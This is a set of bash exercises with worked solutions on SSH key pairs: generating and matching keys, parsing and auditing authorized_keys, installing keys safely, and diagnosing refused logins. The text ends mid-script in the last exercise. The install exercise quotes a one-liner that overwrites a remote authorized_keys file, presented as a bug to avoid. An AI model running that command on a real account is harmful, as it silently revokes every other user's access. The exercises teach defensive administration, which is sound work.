exercises.title: Generate a Key Pair and Prove the Two Halves Belong Together
exercises.problemHtml:
A private key and a public key are not two independent files — the public half is contained in the private one, which is why ssh-keygen -y can rebuild a lost .pub and why both files report the same fingerprint. Turning that fact into a check you can run is the fastest way to answer "are these two files actually a pair?", a question that comes up whenever keys have been copied between machines and renamed.

Write make-key.sh NAME:

  • Generate an Ed25519 key pair at ./NAME and ./NAME.pub, with no passphrase and the comment set to NAME.
  • Refuse to overwrite: if ./NAME already exists, print EXISTS ./NAME and exit 1 without touching anything. Silently replacing a private key is how access is lost permanently.
  • Derive the public key from the private key with ssh-keygen -y and compare it against the generated .pub, ignoring the comment field (which -y does not emit).
  • Print the SHA256 fingerprint of each file and confirm they are equal.
  • On success print three lines: fingerprint: <fp>, derived-matches-pub: yes, bytes: <private> private / <public> public, then exit 0.
  • If the derived key does not match, print MISMATCH and exit 2.

The byte counts are part of the output because seeing 399 against 95 makes the asymmetry concrete: the entire public half is 95 bytes you may publish, and the file that must never move is barely four times larger.
exercises.inputSpec: argv[1] is a base filename for the key pair. No stdin.
exercises.outputSpec: Three lines on success ('fingerprint: SHA256:...', 'derived-matches-pub: yes', 'bytes: N private / M public') and exit 0; 'EXISTS ./NAME' and exit 1; or 'MISMATCH' and exit 2.
exercises.constraints: Ed25519 only. No passphrase (-N ''). Never overwrite an existing private key. Compare only the type and base64 fields — ssh-keygen -y omits the comment, so a naive whole-line comparison always fails.

examplesJson.output:
fingerprint: SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8
derived-matches-pub: yes
bytes: 399 private / 91 public
examplesJson.explanation: A fresh Ed25519 pair. 399 bytes is fixed for Ed25519; the public file is 91 bytes here because the comment id_backup is 9 characters — the same key commented cuong@macbook measures 95. Both figures were taken with wc -c on real generated keys.

examplesJson.output: EXISTS ./id_backup
examplesJson.explanation: Exit 1 and nothing is written. Had the script regenerated, every server carrying the old public key would have stopped accepting this machine, with no error to explain why.

examplesJson.input: ./make-key.sh k   # after replacing k.pub with an unrelated key
examplesJson.output: MISMATCH
examplesJson.explanation: The .pub no longer corresponds to the private key. This is the state you get when keys are copied around and renamed, and it looks completely normal in a directory listing.

hintsJson: `ssh-keygen -t ed25519 -C "$NAME" -f "./$NAME" -N ''` generates without prompting. The -N '' is what makes it non-interactive; without it the command blocks waiting for a passphrase.
`ssh-keygen -y -f ./NAME` prints the public key derived from the private key — but with only two fields, since it does not know the comment. Compare `cut -d' ' -f1,2` of each side.
`ssh-keygen -lf FILE` prints 'bits SHA256:fp comment (TYPE)'. Take field 2 with awk to get just the fingerprint.
Test the overwrite guard before anything else: `[ -e "./$NAME" ] && { echo "EXISTS ./$NAME"; exit 1; }`. Put it above the generate call, not after.

solutionCodeJson.name: make-key.sh
solutionCodeJson.code:
#!/usr/bin/env bash
# Tao mot cap khoa Ed25519 va CHUNG MINH hai nua thuoc ve nhau.
set -uo pipefail

NAME=${1:?usage: make-key.sh NAME}
PRIV="./$NAME"
PUB="./$NAME.pub"

# 1) Chot chong ghi de, dat TRUOC moi thu khac.
#    ssh-keygen co hoi "Overwrite?" — nhung chi khi co terminal. Trong
#    script thi khong co, va hanh vi khi do khong dang de cuoc.
if [ -e "$PRIV" ]; then
  echo "EXISTS $PRIV"
  exit 1
fi

# 2) Sinh khoa. -N '' la thu lam cho lenh nay KHONG TUONG TAC;
#    thieu no thi script treo cho ai do go mat khau.
ssh-keygen -t ed25519 -C "$NAME" -f "$PRIV" -N '' -q

# 3) Suy khoa cong khai tu khoa rieng roi doi chieu.
#    `ssh-keygen -y` chi in HAI truong (loai + base64) vi no khong biet
#    chu thich. So ca dong se LUON khac nhau — cat lay 2 truong dau.
derived=$(ssh-keygen -y -f "$PRIV" | cut -d' ' -f1,2)
stored=$(cut -d' ' -f1,2 < "$PUB")

if [ "$derived" != "$stored" ]; then
  echo "MISMATCH"
  exit 2
fi

# 4) Dau van tay: bang nhau du doc tu file nao, vi dau van tay la bam cua
#    KHOA CONG KHAI, ma khoa cong khai thi nam san trong khoa rieng.
fp_priv=$(ssh-keygen -lf "$PRIV" | awk '{print $2}')
fp_pub=$(ssh-keygen -lf "$PUB"  | awk '{print $2}')
if [ "$fp_priv" != "$fp_pub" ]; then
  echo "MISMATCH"
  exit 2
fi

bytes_priv=$(wc -c < "$PRIV" | tr -d ' ')
bytes_pub=$(wc -c < "$PUB"  | tr -d ' ')

echo "fingerprint: $fp_pub"
echo "derived-matches-pub: yes"
echo "bytes: $bytes_priv private / $bytes_pub public"
exit 0

exercises.solutionExplanationHtml:
Two details decide whether this script works, and both come from knowing what the tools actually emit rather than what you expect them to.

ssh-keygen -y prints two fields, not three. The comment lives only in the .pub file; it is not part of the key and cannot be reconstructed from the private half. Comparing whole lines therefore reports MISMATCH for every correctly matched pair — a check that fails 100% of the time on healthy input, which is worse than no check, because you will eventually "fix" it by deleting a good key. cut -d' ' -f1,2 on both sides compares exactly the part that is cryptographically meaningful.

The overwrite guard has to come first. ssh-keygen asks for confirmation before overwriting — but only when it has a terminal to ask on. Inside a script, in CI, or over ssh host 'cmd' (Module 5), there is no terminal and you should not be relying on a prompt that may not appear. Testing [ -e ] before generating makes the behaviour the same everywhere. The consequence of getting this wrong is unusually harsh: a regenerated key silently invalidates every authorized_keys entry on every server that trusted the old one, and the resulting failure is the silent Permission denied that Module 3 exists to untangle.

The two fingerprint checks are deliberately redundant — deriving the key already proves the pair matches. The second comparison is there because ssh-keygen -lf on the private and public files is the check you will actually run by hand at a terminal, and seeing it produce identical output builds the habit of comparing fingerprints instead of squinting at base64.

exercises.title: Read an authorized_keys File Like the Server Does
exercises.problemHtml:
An authorized_keys file that has been maintained for two years is a list of people who can log in as this user, written in a format nobody reads carefully. Some lines are bare keys. Some carry options like restrict or command="…" that change what the key may do. Some belong to laptops that were replaced long ago.

Before you can decide anything about such a file, you need to see it the way sshd does. Write read-keys.sh FILE that prints one summary line per key.

  • Skip blank lines and lines whose first non-space character is #.
  • For each remaining line print: <n> <type> <fingerprint> <comment> [restricted|open], where <n> is the 1-based line number in the original file — that is the number sshd reports when a key matches, so it must count comments and blanks too.
  • A line is restricted if it begins with options rather than a key type; otherwise open. Key types always start with ssh-, ecdsa- or sk-.
  • The comment is whatever follows the base64 blob. If there is none, print (no-comment).
  • Finish with total: <n> keys, <n> restricted.
  • If the file does not exist print NO-FILE and exit 1.

Getting the fingerprint of one line out of a multi-line file is the interesting part: ssh-keygen -lf works on a file, so a single line has to be handed to it somehow.
exercises.inputSpec: argv[1] is a path to an authorized_keys-format file. Lines may carry leading options, may be comments, and may be blank.
exercises.outputSpec: One line per key: '<lineno> <type> SHA256:<fp> <comment> [restricted|open]', then 'total: N keys, M restricted'. 'NO-FILE' and exit 1 when the path does not exist.
exercises.constraints: Line numbers must match the original file, including skipped lines. Do not assume the key is the first field — options may precede it. Do not use ssh-keygen -lf on the whole file, because it stops at the first unparseable line and you lose the per-line mapping.

examplesJson.explanation: Both fingerprints are from real generated keys. Note the line numbers 2 and 4 — they count the comment and the blank line, exactly as sshd does when it reports 'authorized_keys:42'.

examplesJson.explanation: A key with no comment is legal and common when generated with -C ''. It is also the hardest kind to audit later, which is the point the output makes visible.

examplesJson.explanation: Unreadable and non-existent are treated the same here: either way there is nothing to report. Exit 1.

hintsJson: Use a counter you increment on every line read, including the ones you skip, so the reported number matches what sshd would print.

To find where the key starts, walk the whitespace-separated fields and take the first one matching `ssh-*`, `ecdsa-*` or `sk-*`. Anything before it is the options string, which means the line is restricted.
ssh-keygen -lf needs a file. Write the single key line to a temp file and fingerprint that: `printf '%s\n' "$keypart" > "$tmp"; ssh-keygen -lf "$tmp"`. Remove the temp file in an EXIT trap.
Make the EXIT trap's last command unconditionally succeed (end it with `return 0`). Under set -e, a failing last command inside an EXIT trap replaces your real exit status.

solutionCodeJson.name: read-keys.sh
solutionCodeJson.code:
#!/usr/bin/env bash
# Doc mot file authorized_keys DUNG NHU sshd doc no.
set -uo pipefail

FILE=${1:?usage: read-keys.sh FILE}
[ -r "$FILE" ] || { echo "NO-FILE"; exit 1; }

tmp=$(mktemp)
# `return 0` o cuoi: voi set -e dang bat, mot lenh cuoi that bai trong bay
# EXIT se ghi de ma thoat that cua script.
cleanup() { rm -f "$tmp" 2>/dev/null; return 0; }
trap cleanup EXIT

n=0; keys=0; restricted=0

while IFS= read -r line || [ -n "$line" ]; do
  n=$((n + 1))                       # dem MOI dong, ke ca dong bo qua

  # Bo dong trong va dong chu thich — nhung VAN da tang bo dem o tren,
  # vi so dong sshd bao la so dong trong FILE GOC.
  case "$line" in
    ''|\#*|' '*\#*) [ -z "${line// /}" ] && continue ;;
  esac
  [ -z "${line// /}" ] && continue
  case "${line#"${line%%[! ]*}"}" in \#*) continue ;; esac

  # Tim truong dau tien la LOAI KHOA. Moi thu truoc no la tuy chon.
  idx=0; keyidx=0
  for field in $line; do
    idx=$((idx + 1))
    case "$field" in
      ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;;
    esac
  done
  [ "$keyidx" -eq 0 ] && continue    # khong phai dong khoa

  if [ "$keyidx" -gt 1 ]; then
    tag=restricted; restricted=$((restricted + 1))
  else
    tag=open
  fi

  # Cat bo phan tuy chon, giu lai tu loai khoa tro di.
  keypart=$(printf '%s\n' "$line" | cut -d' ' -f"$keyidx"-)
  comment=$(printf '%s\n' "$keypart" | cut -d' ' -f3-)
  [ -z "$comment" ] && comment='(no-comment)'

  # ssh-keygen -lf lam viec tren FILE. Dua RIENG dong nay cho no —
  # chay tren ca file thi mot dong hong se lam mat anh xa theo dong.
  printf '%s\n' "$keypart" > "$tmp"
  info=$(ssh-keygen -lf "$tmp" 2>/dev/null) || { echo "$n ? (unparseable) $tag"; continue; }
  fp=$(printf '%s\n' "$info" | awk '{print $2}')
  type=$(printf '%s\n' "$info" | awk '{print $NF}' | tr -d '()')

  keys=$((keys + 1))
  echo "$n $type $fp $comment $tag"
done < "$FILE"

echo "total: $keys keys, $restricted restricted"
exit 0

exercises.solutionExplanationHtml:
Three things in this script exist because of how the real format behaves rather than how it is usually described.

The key is not always the first field. A line may open with restrict,command="/usr/local/bin/backup-only.sh" before the key type. Any parser that assumes $1 is the type silently misreads every restricted key — and restricted keys are precisely the ones an audit cares about. Scanning for the first field matching ssh-*, ecdsa-* or sk-* finds the boundary without needing to parse the options grammar, which is genuinely fiddly because option values may contain quoted spaces.

Line numbers count everything. When sshd accepts a key it logs Remote: /root/.ssh/authorized_keys:42, and 42 is the line in the file on disk — comments and blanks included. A tool that numbers only the keys produces indexes that cannot be matched against that log line, defeating the main reason for having the numbers at all. Incrementing the counter before the skip tests keeps them aligned.

Fingerprinting one line at a time. ssh-keygen -lf accepts a file, and running it over the whole authorized_keys is tempting. It stops at the first line it cannot parse, so one corrupted entry truncates the report — and it returns fingerprints with no indication of which line each came from. Writing each key to a temp file costs one write per key and keeps the mapping exact, including the ability to report an unparseable line in place rather than vanishing.

The || [ -n "$line" ] on the read handles a final line with no trailing newline, which is common in files edited by scripts using echo -n or by ssh-copy-id on some systems. Without it the last key in such a file is silently dropped — the kind of bug that only shows up on the one server whose file was edited by hand.

exercises.title: Install a Key Without Deleting Everyone Else's
exercises.problemHtml:
The one-liner everyone learns for installing a key is cat key.pub | ssh host 'cat > ~/.ssh/authorized_keys', and it contains a single-character bug that removes every other key on the account. The session you are using survives, so nothing appears wrong until a colleague or a CI job fails hours later.

Write install-key.sh PUBKEY HOST that does the job safely.

  • Append, never overwrite.
  • Be idempotent: running it twice must not add the key twice. Match on the base64 field, not the whole line, because the comment may differ between copies of the same key.
  • Create ~/.ssh if missing with mode 700, and ensure authorized_keys ends up mode 600. A world-readable file is refused silently by sshd (Module 3).
  • After installing, verify from a fresh connection that key-only authentication now works, using -o BatchMode=yes -o PreferredAuthentications=publickey. Do not trust the write; prove it.
  • Print ADDED <fp>, or ALREADY-PRESENT <fp> if it was already there, then VERIFIED on a successful test login.
  • If the write succeeded but verification fails, print WARN installed but login still fails — see Module 3 to stderr and exit 3.

The verification step is what makes this script worth writing. Every other failure mode in this track shares one symptom, and the moment to discover it is while you still have a working session open — not after you have closed it.
exercises.inputSpec: argv[1] is a path to a local .pub file. argv[2] is the SSH destination. The first connection may require a password, so BatchMode is not used for the install step.
exercises.outputSpec: 'ADDED SHA256:<fp>' or 'ALREADY-PRESENT SHA256:<fp>', followed by 'VERIFIED' on success (exit 0). On verification failure, a WARN line on stderr and exit 3.
exercises.constraints: Use >> for the append. The duplicate check must compare the base64 field only. Never write authorized_keys with a mode looser than 600, and never create ~/.ssh looser than 700. The verification must open a new connection rather than reusing the install one.

VERIFIED
examplesJson.explanation: First run: the key is appended, permissions are corrected, and a fresh key-only connection succeeds.

examplesJson.explanation: Idempotent. Without the base64 comparison, a second run appends a duplicate line, which works but makes the file harder to audit and eventually pushes past MaxAuthTries.

examplesJson.explanation: Reproduced with chmod 777 on the home directory. The key really is in the file and sshd refuses it anyway, logging 'Authentication refused: bad ownership or modes for directory /home/cuong'. Catching this while a session is still open is the whole point of verifying.

hintsJson: Extract the base64 field locally with `awk '{print $2}' "$PUBKEY"`. That single field is what identifies the key; type and comment are not reliable for comparison.
Do the remote work with a quoted heredoc and `bash -s`, passing the key line and the base64 field as environment variables. It avoids a quoting war and keeps the remote logic readable.
Use `grep -qF -- "$b64"` on the remote side for the duplicate test. -F makes it a literal comparison so base64 characters like + and / are not treated as regex.

Verify with a second, separate ssh call using -o BatchMode=yes -o PreferredAuthentications=publickey -o IdentitiesOnly=yes -i <the private key>. BatchMode is essential: without it a failed key silently falls back to a password prompt and the test appears to pass.

solutionCodeJson.name: install-key.sh
solutionCodeJson.code:
#!/usr/bin/env bash
# Cai mot khoa cong khai len may xa MA KHONG xoa khoa cua nguoi khac.
set -uo pipefail

PUBKEY=${1:?usage: install-key.sh PUBKEY HOST}
HOST=${2:?usage: install-key.sh PUBKEY HOST}
[ -r "$PUBKEY" ] || { echo "khong doc duoc $PUBKEY" >&2; exit 1; }

KEYLINE=$(head -1 "$PUBKEY")
B64=$(awk '{print $2}' "$PUBKEY")           # truong dinh danh THAT SU
FP=$(ssh-keygen -lf "$PUBKEY" | awk '{print $2}')
PRIV=${PUBKEY%.pub}                          # khoa rieng de kiem chung

# ── Cai dat ─────────────────────────────────────────────────────────
# Heredoc CO NHAY: than script di nguyen ven, khong bi shell may nha gian.
# KEYLINE va B64 di qua bien moi truong mot cach tuong minh.
result=$(ssh "$HOST" "KEYLINE='$KEYLINE' B64='$B64' bash -s" <<'REMOTE'
  set -euo pipefail
  mkdir -p ~/.ssh
  chmod 700 ~/.ssh
  touch ~/.ssh/authorized_keys

  # -F: so sanh CHUOI THUAN. Base64 chua + va / — de nguyen cho regex
  # doc thi ket qua se sai theo kieu rat kho thay.
  if grep -qF -- "$B64" ~/.ssh/authorized_keys; then
    echo "ALREADY"
  else
    # >> chu KHONG phai >. Mot dau > o day xoa sach khoa cua moi nguoi,
    # va phien ban dang dung van song nen khong co gi bao cho ban biet.
    printf '%s\n' "$KEYLINE" >> ~/.ssh/authorized_keys
    echo "ADDED"
  fi
  chmod 600 ~/.ssh/authorized_keys
REMOTE
) || { echo "khong cai duoc khoa (ssh that bai)" >&2; exit 1; }

case "$result" in
  ALREADY) echo "ALREADY-PRESENT $FP" ;;
  ADDED)   echo "ADDED $FP" ;;
  *)       echo "ket qua la khong ro: $result" >&2; exit 1 ;;
esac

# ── Kiem chung ──────────────────────────────────────────────────────
# Ket noi MOI, CHI cho phep khoa. BatchMode=yes la bat buoc: thieu no,
# mot cai khoa bi tu choi se lang le quay ve hoi mat khau, ban go vao,
# va phep kiem bao "thanh cong" cho mot cau hinh van dang hong.
if ssh -o BatchMode=yes \
       -o PreferredAuthentications=publickey \
       -o IdentitiesOnly=yes \
       -o ConnectTimeout=10 \
       -i "$PRIV" "$HOST" true 2>/dev/null; then
  echo "VERIFIED"
  exit 0
fi

echo "WARN installed but login still fails — see Module 3" >&2
exit 3

exercises.solutionExplanationHtml:
The one-character bug. > truncates; >> appends. With >, every other key on that account is gone the instant the command runs — a colleague's laptop, the CI deploy key, the backup key from Module 2's worked example. The connection you are sitting in stays alive because authentication already happened, so there is no feedback at all. The damage surfaces the next time someone else connects, by which point the cause is hours behind you.

Why the duplicate check compares base64 only. The same key installed from two machines can carry different comments (cuong@macbook versus cuong@macbook.local), and options may be prepended on one copy. Comparing whole lines therefore reports "not present" for a key that is present, and appends a second copy. Beyond untidiness that has a real cost: each stored key the client offers counts against MaxAuthTries, which is 6 on the production VPS, so accumulating duplicates eventually disconnects clients before their working key is reached. grep -F matters too — base64 contains + and /, which a regex would interpret.

Verification is the part that earns its keep. Writing the file proves nothing, because sshd may still refuse the key for reasons the write cannot detect: a group-writable home directory, an SELinux label, PubkeyAuthentication no, or an AllowUsers line that excludes this account. All four produce the identical Permission denied (publickey,password). Testing on a separate connection while the original session is still open means you find out at the only moment when fixing it is easy.

BatchMode=yes is not optional in that test. Without it, a rejected key falls back to a password prompt; you type the password out of habit, the connection succeeds, and the script reports VERIFIED for a key that does not work. The test would confirm exactly the wrong thing.

exercises.title: Is the Right Key Even Installed?
exercises.problemHtml:
When a key is refused there are four possible causes, and they all print the same message. Before investigating permissions, SELinux or server config, it is worth eliminating the cheapest possibility first: the key you are offering is simply not in the file.

Answering that turns out to be a string comparison, because a fingerprint can be computed from a private key, from a public key, and from a line in authorized_keys — and all three agree when they describe the same key.

Write key-installed.sh KEYFILE HOST:

  • Compute the fingerprint of KEYFILE locally. It must work whether the caller passes the private key or the .pub.
  • Fetch the remote ~/.ssh/authorized_keys and compute the fingerprint of every line in it.
  • If the local fingerprint appears, print INSTALLED <fp> at line <n> and exit 0.
  • If it does not, print NOT-INSTALLED <fp>, then list the fingerprints that are present as present: <fp> <comment> lines, and exit 4. Showing what is there turns a dead end into a lead — often the answer is that your key is installed for a different user.
  • If the remote file is missing or unreadable, print NO-REMOTE-FILE and exit 5.
  • Do not use the key being tested to connect. Diagnosing a broken key by requiring it to work is circular; the connection may use a password or another key.

The line number is worth reporting because sshd names it in its logs, which lets you match this output against the server's own record of which key opened the door.

exercises.outputSpec: 'INSTALLED SHA256:<fp> at line <n>' (exit 0); 'NOT-INSTALLED SHA256:<fp>' followed by 'present: <fp> <comment>' lines (exit 4); or 'NO-REMOTE-FILE' (exit 5).
exercises.constraints: The connection must not depend on the key being tested — do not pass it with -i. Handle both key file kinds without asking the caller which one it is. Ignore blank and comment lines in the remote file. Options preceding a key must not break the fingerprinting.

examplesJson.explanation: Distinct from NOT-INSTALLED: there is no file at all, which usually means the key was installed into a different user's home directory. Exit 5.

#!/usr/bin/env bash
# Khoa cua toi CO nam trong authorized_keys tren may do khong?
# Loai bo cau hoi re nhat truoc khi di dao quyen file va SELinux.
set -uo pipefail

KEYFILE=${1:?usage: key-installed.sh KEYFILE HOST}
HOST=${2:?usage: key-installed.sh KEYFILE HOST}
[ -r "$KEYFILE" ] || { echo "khong doc duoc $KEYFILE" >&2; exit 1; }

tmp=$(mktemp)
cleanup() { rm -f "$tmp" 2>/dev/null; return 0; }
trap cleanup EXIT

# 1) Dau van tay o may minh. ssh-keygen -lf doc duoc ca hai loai file,
#    vi dau van tay la bam cua khoa CONG KHAI, ma khoa cong khai nam
#    san ben trong khoa rieng.
MINE=$(ssh-keygen -lf "$KEYFILE" 2>/dev/null | awk '{print $2}')
[ -n "$MINE" ] || { echo "khong doc duoc khoa tu $KEYFILE" >&2; exit 1; }

# 2) Doc file o may xa. KHONG dung -i "$KEYFILE": neu cai khoa do dang
#    hong thi ta se khong ket noi duoc de ma di tim hieu vi sao no hong.
remote=$(ssh -o ConnectTimeout=10 "$HOST" 'cat ~/.ssh/authorized_keys 2>/dev/null')
if [ -z "$remote" ]; then
  echo "NO-REMOTE-FILE"
  exit 5
fi

# 3) Bam tung dong.
n=0
present=()
while IFS= read -r line || [ -n "$line" ]; do
  n=$((n + 1))                        # dem CA dong trong lan chu thich
  [ -z "${line// /}" ] && continue
  case "${line#"${line%%[! ]*}"}" in \#*) continue ;; esac

  # Cat bo phan tuy chon dau dong (restrict, command="..." ...)
  idx=0; keyidx=0
  for field in $line; do
    idx=$((idx + 1))
    case "$field" in ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;; esac
  done
  [ "$keyidx" -eq 0 ] && continue

  keypart=$(printf '%s\n' "$line" | cut -d' ' -f"$keyidx"-)
  printf '%s\n' "$keypart" > "$tmp"
  info=$(ssh-keygen -lf "$tmp" 2>/dev/null) || continue
  fp=$(printf '%s\n' "$info" | awk '{print $2}')
  comment=$(printf '%s\n' "$keypart" | cut -d' ' -f3-)
  [ -z "$comment" ] && comment='(no-comment)'

  if [ "$fp" = "$MINE" ]; then
    echo "INSTALLED $MINE at line $n"
    exit 0
  fi
  present+=("$fp $comment")
done <<EOF
$remote
EOF

# 4) Khong khop. Liet ke nhung gi DANG co — bien mot ngo cut thanh manh moi.
#    Rat hay gap: khoa duoc cai dung, nhung cho NGUOI DUNG KHAC.
echo "NOT-INSTALLED $MINE"
for p in ${present[@]+"${present[@]}"}; do
  echo "present: $p"
done
exit 4

exercises.solutionExplanationHtml:
Not using the key under test is the design constraint that matters. The obvious implementation passes -i "$KEYFILE" to read the remote file — and then the tool cannot run in exactly the situation it was built for, because the key is refused. Diagnosis has to be able to proceed through a channel that does not depend on the thing being diagnosed. Here that means connecting however the caller normally can: a password, a different key, or an already-working agent identity.

One command eliminates three of the four causes. If the remote file is readable and contains keys, then sshd could read it too, the account exists, and the home directory is reachable. A NOT-INSTALLED verdict therefore rules out permissions, SELinux labels and server configuration in a single step, and points at the one remaining explanation. That is a large amount of diagnostic value from a string comparison, and it is available only because the same fingerprint can be computed from three different representations of the key.

Listing what is present converts a negative result into a lead. The most common real cause of a genuinely absent key is installing it into the wrong user's home directory — /root/.ssh/authorized_keys while connecting as cuong. Seeing an unfamiliar set of comments under present: is usually enough to recognise that immediately, whereas a bare "not found" sends people to check permissions they have no reason to suspect.

Two portability notes. The remote content is fed to the loop through a heredoc rather than a pipe, so the while body runs in the current shell and the present array survives — piping into while puts the loop in a subshell and every accumulated value is discarded at the end. And ${present[@]+"${present[@]}"} guards the expansion of a possibly-empty array under set -u in bash 3.2, which is what macOS still ships.

exercises.title: Passphrase-Protected or Never Installed? Same Message, Different Cure
exercises.problemHtml:
A CI job fails with Permission denied (publickey,password). So does a laptop whose key was never installed. So does a key that is installed correctly but sits behind a passphrase that nothing can type. One message, three states, three different fixes — and the message is the same because sshd deliberately refuses to explain which one applies.

Two of those three are decidable locally, without touching the server at all, and doing so first saves you from investigating a server that has nothing wrong with it.

Write key-doctor.sh KEYFILE [HOST]:

  • Check 1 — does the file parse as a private key? If not, print BAD-KEY-FILE and exit 1. A truncated or line-wrapped key (pasted through a chat client, stored in a CI secret with mangled newlines) lands here.
  • Check 2 — is it passphrase-protected? Print ENCRYPTED or PLAINTEXT. Determine it without prompting the user for anything.
  • Check 3 — is it loaded into the agent? Print IN-AGENT yes or IN-AGENT no, comparing by fingerprint. An encrypted key that is loaded in the agent works fine in scripts; an encrypted key that is not cannot work at all.
  • Check 4 — verdict. Print USABLE-NON-INTERACTIVE yes when the key is either plaintext or present in the agent, otherwise no.
  • If HOST was given and the key is usable non-interactively, attempt a real key-only login and print LOGIN ok or LOGIN refused. Skip this when the key is unusable — the result would be meaningless.
  • Exit 0 when the key is usable non-interactively, 2 when it is not.

The point is the ordering: three local checks that need no network, then one remote check that is only meaningful if the local ones passed.

exercises.outputSpec: 'BAD-KEY-FILE' (exit 1), or four lines — 'ENCRYPTED|PLAINTEXT', 'IN-AGENT yes|no', 'USABLE-NON-INTERACTIVE yes|no', and optionally 'LOGIN ok|refused' — with exit 0 when usable and 2 when not.
exercises.constraints: Never prompt for a passphrase; every check must be non-interactive. Do not read the key file's contents looking for the string 'ENCRYPTED' — the modern OPENSSH format does not mark encryption in a way that grep can see. The live login must use BatchMode=yes, PreferredAuthentications=publickey and IdentitiesOnly=yes.

#!/usr/bin/env bash
# Ba trang thai khac nhau, MOT thong bao loi giong het nhau.
# Hai trong ba quyet dinh duoc NGAY TAI MAY MINH, khong can mang.
set -uo pipefail

KEYFILE=${1:?usage: key-doctor.sh KEYFILE [HOST]}
HOST=${2:-}
[ -r "$KEYFILE" ] || { echo "BAD-KEY-FILE"; exit 1; }

# ── 1) File co doc duoc nhu mot khoa khong? ─────────────────────────
# ssh-keygen -lf doc NUA CONG KHAI, nen no thanh cong voi moi khoa dung
# dinh dang — ke ca khoa dang ma hoa. Hong o day = file that su hong
# (bi cat cut, bi be dong khi di qua chat, bi hong newline trong CI secret).
FP=$(ssh-keygen -lf "$KEYFILE" 2>/dev/null < /dev/null | awk '{print $2}')
if [ -z "$FP" ]; then
  echo "BAD-KEY-FILE"
  exit 1
fi

# ── 2) Co mat khau bao ve khong? ────────────────────────────────────
# Thu doc NUA RIENG voi mat khau RONG. Doc duoc = khong ma hoa.
# KHONG duoc grep chu "ENCRYPTED" trong file: dinh dang OPENSSH moi
# khong danh dau kieu do — chi dinh dang PEM cu moi co.
# < /dev/null: neu phien ban nao do van doi hoi thi no nhan EOF chu
# khong treo script cho ai go phim.
if ssh-keygen -y -f "$KEYFILE" -P '' >/dev/null 2>&1 < /dev/null; then
  echo "PLAINTEXT"
  encrypted=0
else
  echo "ENCRYPTED"
  encrypted=1
fi

# ── 3) Agent co dang giu no khong? ──────────────────────────────────
# ssh-add -l thoat 1 khi agent rong, 2 khi khong co agent nao.
# Ca hai deu la "khong duoc nap", khong phai loi cua ta.
in_agent=0
if agent_list=$(ssh-add -l 2>/dev/null); then
  case "$agent_list" in *"$FP"*) in_agent=1 ;; esac
fi
[ "$in_agent" -eq 1 ] && echo "IN-AGENT yes" || echo "IN-AGENT no"

# ── 4) Ket luan ─────────────────────────────────────────────────────
# Dung duoc trong script khi: khong ma hoa, HOAC da nap vao agent.
if [ "$encrypted" -eq 0 ] || [ "$in_agent" -eq 1 ]; then
  usable=1; echo "USABLE-NON-INTERACTIVE yes"
else
  usable=0; echo "USABLE-NON-INTERACTIVE no"
fi

# Chi thu dang nhap that khi phep thu do CO Y NGHIA. Chay no voi mot cai
# khoa khong dung duoc se ra "refused" — va cau tra loi do khong noi gi
# ve may chu ca, dung la thu nham lan ma cong cu nay sinh ra de tranh.
if [ -n "$HOST" ] && [ "$usable" -eq 1 ]; then
  if ssh -o BatchMode=yes \
         -o PreferredAuthentications=publickey \
         -o IdentitiesOnly=yes \
         -o ConnectTimeout=10 \
         -i "$KEYFILE" "$HOST" true 2>/dev/null; then
    echo "LOGIN ok"
  else
    echo "LOGIN refused"
  fi
fi

[ "$usable" -eq 1 ] && exit 0
exit 2

exercises.solutionExplanationHtml:
Detecting encryption without prompting. The instinct is grep ENCRYPTED keyfile, which worked for the old PEM format where a header literally said Proc-Type: 4,ENCRYPTED. The modern OPENSSH PRIVATE KEY container does not expose that: the whole body is base64 and the cipher name is inside it. The reliable test is behavioural — ask ssh-keygen -y to read the private half with an empty passphrase (-P '') and see whether it succeeds. That distinguishes plaintext from encrypted using the same code path SSH itself would take.

Why -lf and -y give different answers, and why both are needed. -lf reads only the public half, which is stored unencrypted even in a passphrase-protected file, so it succeeds for any well-formed key. -y must decrypt the private half. A file where -lf succeeds and -y -P '' fails is encrypted; a file where both fail is corrupt. Testing them in that order is what separates ENCRYPTED from BAD-KEY-FILE, and those two have nothing in common as problems.

< /dev/null on every check. A tool that might prompt will block forever inside CI, and the job dies at the runner's global timeout with no useful log. Redirecting stdin from /dev/null converts any prompt into an immediate EOF and therefore into a clean failure your code can classify. This is the same discipline as BatchMode=yes for ssh, applied to the key tools.

Skipping the remote test when the key is unusable is the ordering decision that gives the tool its value. An encrypted key with no agent will be refused by every server on earth; printing LOGIN refused in that case invites someone to go and inspect authorized_keys, file permissions and SELinux on a machine that is behaving perfectly. Three local checks, costing no network at all, decide whether the remote question is even worth asking.

exercises.title: Audit Which Keys Are Unrestricted
exercises.problemHtml:
Every line in authorized_keys grants a full interactive shell unless it says otherwise. That default is right for a person and wrong for everything else: a backup key, a monitoring key or a CI deploy key needs one command, and giving it a shell means a leaked key is a shell rather than a database dump.

Write audit-keys.sh FILE that classifies each key by how much it grants and produces a report you could act on.

  • OPEN — no options at all. Full shell, all forwarding, everything.
  • PARTIAL — some options, but neither restrict nor command=. Something was tightened; the key can still open a shell.
  • COMMAND — has command=. Limited to one command.
  • LOCKED — has restrict and command=. The strongest common shape.
  • Print one line per key: <class> line <n> <comment>.
  • Then a summary: summary: <o> open, <p> partial, <c> command, <l> locked.
  • Exit 1 if any key is OPEN and its comment looks automated — containing any of ci, deploy, backup, bot, runner as a substring, case-insensitively. A human's laptop key being OPEN is normal; a key called backup-puller being OPEN is a finding.

That last rule is what makes the tool usable. An audit that flags every unrestricted key produces a list nobody acts on, because most unrestricted keys are people and are supposed to be. Flagging only the keys whose own comment says they belong to a machine yields a short list that is nearly always genuine.

exercises.outputSpec:
One ' line ' per key, then 'summary: open,

partial, command, locked'. Exit 1 if any automated-looking key is OPEN, else 0.
exercises.constraints: The class must be decided from the options string only. Do not match 'command=' inside the base64 blob or inside a comment. Comment matching for the automation heuristic is case-insensitive substring matching. Line numbers must match the original file.

#!/usr/bin/env bash
# Moi dong khong co tuy chon la cap MOT SHELL DAY DU. Xem cai nao dang the.
set -uo pipefail

FILE=${1:?usage: audit-keys.sh FILE}
[ -r "$FILE" ] || { echo "NO-FILE"; exit 1; }

open=0; partial=0; cmd=0; locked=0; finding=0
n=0

while IFS= read -r line || [ -n "$line" ]; do
  n=$((n + 1))
  [ -z "${line// /}" ] && continue
  case "${line#"${line%%[! ]*}"}" in \#*) continue ;; esac

